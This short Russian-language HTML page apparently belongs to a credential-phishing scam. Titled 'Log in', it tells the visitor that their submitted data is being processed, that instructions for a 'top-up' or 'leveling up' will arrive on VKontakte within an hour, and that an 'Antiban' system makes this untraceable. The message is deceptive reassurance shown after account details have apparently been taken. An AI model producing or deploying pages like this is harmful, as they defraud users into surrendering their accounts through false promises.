<html>
<head>
  <link rel="shortcut icon" href="faviconnew.ico" />
<title>Авторизуйтесь</title>
</head>
<body>			

                    <center>Прокачка</center>
                   <center> Ваши данные. приняты к обработке, примерно через 1 час вам вконтакт придёт инструкция.  </center>
		  <center>  Благодаря системе Antiban пополнение невозможно отследить и вы не рискуете быть забаненным. Версия приложения 2.1.2. Тем не менее, советуем не пользоваться пополнением очень часто  <c/enter>

</body>	
</html>